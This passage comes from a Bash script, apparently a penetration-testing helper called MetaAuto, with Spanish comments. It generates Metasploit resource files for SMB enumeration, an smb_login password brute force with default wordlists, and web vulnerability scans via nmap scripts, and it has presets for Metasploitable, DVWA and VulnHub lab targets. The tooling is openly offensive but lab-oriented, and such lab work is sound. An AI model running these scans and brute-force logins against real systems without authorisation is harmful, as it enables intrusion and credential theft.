    
    log "SUCCESS" "Escaneo Heartbleed completado"
}

# Escaneo vulnerabilidades SMB
scan_smb_vulns() {
    log "INFO" "Escaneando vulnerabilidades SMB en $RHOST"
    
    local rc_file="$RESULTS_DIR/smb_scan_$TIMESTAMP.rc"
    
    cat > "$rc_file" << EOF
use auxiliary/scanner/smb/smb_version
set RHOSTS $RHOST
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS $RHOST
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS $RHOST
run

use auxiliary/scanner/smb/smb_login
set RHOSTS $RHOST
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set STOP_ON_SUCCESS true
run

exit
EOF
    
    msfconsole -r "$rc_file" | tee "$RESULTS_DIR/smb_results_$TIMESTAMP.txt"
    log "SUCCESS" "Escaneo SMB completado"
}

# Escaneo vulnerabilidades web
scan_web_vulns() {
    log "INFO" "Escaneando vulnerabilidades web en $RHOST"
    
    # Usar nmap scripts para vulnerabilidades web
    nmap -sV -p 80,443,8080,8443 \
        --script http-enum,http-vuln-*,http-sql-injection \
        "$RHOST" | tee "$RESULTS_DIR/web_vulns_results_$TIMESTAMP.txt"
    
    # Usar Metasploit auxiliares web
    local rc_file="$RESULTS_DIR/web_scan_$TIMESTAMP.rc"
    
    cat > "$rc_file" << EOF
use auxiliary/scanner/http/dir_scanner
set RHOSTS $RHOST
run

use auxiliary/scanner/http/files_dir
set RHOSTS $RHOST
run

use auxiliary/scanner/http/http_version
set RHOSTS $RHOST
run

use auxiliary/scanner/http/options
set RHOSTS $RHOST
run

exit
EOF
    
    msfconsole -r "$rc_file" | tee -a "$RESULTS_DIR/web_vulns_results_$TIMESTAMP.txt"
    log "SUCCESS" "Escaneo web completado"
}

# Escaneo personalizado
custom_vuln_scan() {
    read -p "Introduce el módulo de escaneo (ej: auxiliary/scanner/portscan/tcp): " scan_module
    if [ -z "$scan_module" ]; then
        log "ERROR" "Debes especificar un módulo de escaneo"
        return 1
    fi
    
    local rc_file="$RESULTS_DIR/custom_scan_$TIMESTAMP.rc"
    
    cat > "$rc_file" << EOF
use $scan_module
set RHOSTS $RHOST
set THREADS $THREADS
show options
run
exit
EOF
    
    log "INFO" "Ejecutando escaneo personalizado con: $scan_module"
    msfconsole -r "$rc_file" | tee "$RESULTS_DIR/custom_scan_results_$TIMESTAMP.txt"
    log "SUCCESS" "Escaneo personalizado completado"
}

# Función de auto-setup para laboratorios
lab_setup() {
    echo -e "${CYAN}=== CONFIGURACIÓN DE LABORATORIO ===${NC}"
    echo "1. Configurar para Metasploitable"
    echo "2. Configurar para DVWA"
    echo "3. Configurar para VulnHub VM"
    echo "4. Configurar entorno personalizado"
    echo "0. Volver"
    
    read -p "Selecciona configuración: " lab_choice
    
    case $lab_choice in
        1) setup_metasploitable ;;
        2) setup_dvwa ;;
        3) setup_vulnhub ;;
        4) setup_custom_lab ;;
        0) return ;;
        *) log "ERROR" "Opción inválida" ;;
    esac
}

# Configuración Metasploitable
setup_metasploitable() {
    log "INFO" "Configurando para Metasploitable..."
    read -p "IP de Metasploitable: " metasploitable_ip
    
    RHOST="$metasploitable_ip"
    WORKSPACE="metasploitable"
    THREADS=5
    STEALTH_MODE="false"
    
    save_config
    log "SUCCESS" "Configuración para Metasploitable guardada"
}

# Configuración DVWA
setup_dvwa() {
    log "INFO" "Configurando para DVWA..."
    read -p "IP de DVWA: " dvwa_ip
    read -p "Puerto de DVWA [80]: " dvwa_port
    dvwa_port=${dvwa_port:-80}
    
    RHOST="$dvwa_ip"
    RPORT="$dvwa_port"
    WORKSPACE="dvwa"
    THREADS=3
    STEALTH_MODE="true"
    
    save_config
    log "SUCCESS" "Configuración para DVWA guardada"
}

# Monitor de progreso
show_progress() {
    local current=$1
    local total=$2
    local width=50
    local percentage=$((current * 100 / total))
    local completed=$((current * width / total))
    
    printf "\r["
    for ((i=0; i<completed; i++)); do printf "#"; done
    for ((i=completed; i<width; i++)); do printf " "; done
    printf "] %d%% (%d/%d)" "$percentage" "$current" "$total"
}

# Función de validación de entrada
validate_input() {
    local input="$1"
    local type="$2"
    
    case $type in
        "ip")
            if [[ $input =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
                return 0
            else
                log "ERROR" "IP inválida: $input"
                return 1
            fi
            ;;
        "port")
            if [[ $input =~ ^[0-9]+$ ]] && [ "$input" -ge 1 ] && [ "$input" -le 65535 ]; then
                return 0
            else
                log "ERROR" "Puerto inválido: $input"
                return 1
            fi
            ;;
        "number")
            if [[ $input =~ ^[0-9]+$ ]]; then
                return 0
            else
                log "ERROR" "Número inválido: $input"
                return 1
            fi
            ;;
    esac
}

# Función principal
main() {
    # Verificar si se ejecuta como root (recomendado para algunas funciones)
    if [ "$EUID" -eq 0 ]; then
        log "WARN" "Ejecutándose como root. Ten cuidado."
    fi
    
    # Inicialización
    check_dependencies
    initialize_config
    load_config
    
    # Verificar argumentos de línea de comandos
    case "${1:-}" in
        "-h"|"--help")
            show_help
            exit 0
            ;;
        "-v"|"--version")
            echo "MetaAuto v2.0"
            exit 0
            ;;
        "--target")
            RHOST="$2"
            save_config
            log "INFO" "Objetivo establecido: $RHOST"
            ;;
    esac
    
    # Mostrar banner y menu principal
    main_menu
}

# Trap para limpieza al salir
trap 'cleanup; echo -e "\n${YELLOW}Proceso interrumpido. Limpiando...${NC}"; exit 1' INT TERM

# Ejecutar función principal si el script se ejecuta directamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
